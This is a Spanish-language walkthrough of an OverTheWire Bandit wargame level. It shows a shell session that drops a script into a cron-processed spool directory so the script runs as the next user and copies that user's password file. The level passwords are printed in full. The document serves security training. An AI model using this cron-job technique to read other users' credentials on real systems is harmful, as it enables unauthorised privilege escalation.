# Bandit

## Objetivo
Un programa se ejecuta automáticamente a intervalos regulares desde **cron** , el programador de trabajos basado en el tiempo. Busque en **/etc/cron.d/** la configuración y vea qué comando se está ejecutando.

**NOTA:** este nivel requiere que cree su propio primer script de shell. ¡Este es un paso muy grande y deberías estar orgulloso de ti mismo cuando superes este nivel!

**NOTA 2:** tenga en cuenta que su script de shell se elimina una vez que se ejecuta, por lo que es posible que desee conservar una copia...
## Datos de acceso
Usuario: bandit23
Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solucion
```shell
bandit23@bandit:~$ ls -la /etc/cron.d
total 48
drwxr-xr-x   2 root root 4096 Sep  1 06:30 .
drwxr-xr-x 110 root root 4096 Sep  8 12:09 ..
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit15_root
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit17_root
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit22
-rw-r--r--   1 root root  122 Sep  1 06:30 cronjob_bandit23
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit24
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit25_root
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rwx------   1 root root   52 Sep  1 06:30 otw-tmp-dir
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root  396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.ssh
cat: /usr/bin/cronjob_bandit24.ssh: No such file or directory
bandit23@bandit:~$ mkdir /tmp/kiriha
bandit23@bandit:~$ cd /tmp/kiriha
bandit23@bandit:/tmp/kiriha$ echo "cat /etc/bandit_pass/bandit24 > /tmp/kiriha/password" > kiriha.sh
bandit23@bandit:/tmp/kiriha$ cat kiriha
cat: kiriha: No such file or directory
bandit23@bandit:/tmp/kiriha$ cat kiriha.sh
cat /etc/bandit_pass/bandit24 > /tmp/kiriha/password
bandit23@bandit:/tmp/kiriha$ chmod 777 kiriha.sh
bandit23@bandit:/tmp/kiriha$ touch password
bandit23@bandit:/tmp/kiriha$ ls -la
total 332
drwxrwxr-x   2 bandit23 bandit23   4096 Sep 26 00:26 .
drwxrwx-wt 300 root     root     327680 Sep 26 00:22 ..
-rwxrwxrwx   1 bandit23 bandit23     53 Sep 26 00:24 kiriha.sh
-rw-rw-r--   1 bandit23 bandit23      0 Sep 26 00:26 password
bandit23@bandit:/tmp/kiriha$ chmod 666 password
bandit23@bandit:/tmp/kiriha$ cp kiriha.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kiriha$ date
Mon Sep 26 12:34:44 AM UTC 2022

bandit23@bandit:/tmp/kiriha$ cat password

VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
## Notas adicionales
Fijate en los /usr/bin/cronjob_bandit24.sh cuando se haga el cat /etc/cron.d/cronjob_bandit24 ya que ahi nos decia al tiempo en que se tardaria en copiar la contraseña.
## Referencias

